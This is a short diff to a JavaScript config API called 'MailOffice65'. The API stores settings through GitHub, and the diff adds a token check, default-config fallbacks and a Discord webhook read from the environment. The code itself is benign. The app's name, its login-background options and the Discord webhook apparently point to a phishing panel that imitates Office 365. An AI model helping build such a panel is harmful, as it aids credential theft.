@@ -1,5 +1,6 @@
 // API de configuración - GitHub-backed persistence
 // Lee/escribe config.json desde el repositorio de GitHub usando la API REST
+// Si GH_TOKEN no está configurado, usa configuración por defecto embebida
 
 import { Buffer } from 'node:buffer';
 
@@ -11,7 +12,7 @@ const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents
 
 // Configuración por defecto
 const DEFAULT_CONFIG = {
-  discordWebhook: '',
+  discordWebhook: process.env.DISCORD_WEBHOOK || '',
   discordMessageTemplate: '',
   loginBgType: 'image',
   loginBgColor: '#0a0a1a',
@@ -29,6 +30,10 @@ const headers = {
   'User-Agent': 'MailOffice65/1.0',
   'X-GitHub-Api-Version': '2022-11-28',
 };
+
+function canUseGithub() {
+  return GH_TOKEN && GH_TOKEN.length > 10;
+}
 
 async function githubRead() {
   const res = await fetch(GITHUB_API, { method: 'GET', headers });
@@ -68,6 +73,11 @@ export default async function handler(req, res) {
   }
 
   if (req.method === 'GET') {
+    if (!canUseGithub()) {
+      // Sin GitHub token: devolver configuración por defecto
+      return res.status(200).json({ ...DEFAULT_CONFIG });
+    }
+
     try {
       const { content, sha } = await githubRead();
       if (!content) {
@@ -76,12 +86,16 @@ export default async function handler(req, res) {
       return res.status(200).json({ ...DEFAULT_CONFIG, ...content, _sha: sha });
     } catch (err) {
       console.error('Config read error:', err);
-      // Fallback a defaults si GitHub falla
       return res.status(200).json({ ...DEFAULT_CONFIG });
     }
   }
 
   if (req.method === 'PUT' || req.method === 'PATCH') {
+    if (!canUseGithub()) {
+      // Sin GitHub token: no se puede escribir al servidor
+      return res.status(503).json({ error: 'GitHub token no configurado. Usa localStorage en el cliente.' });
+    }
+
     try {
       const { content: existing, sha } = await githubRead();
       const updates = req.body || {};
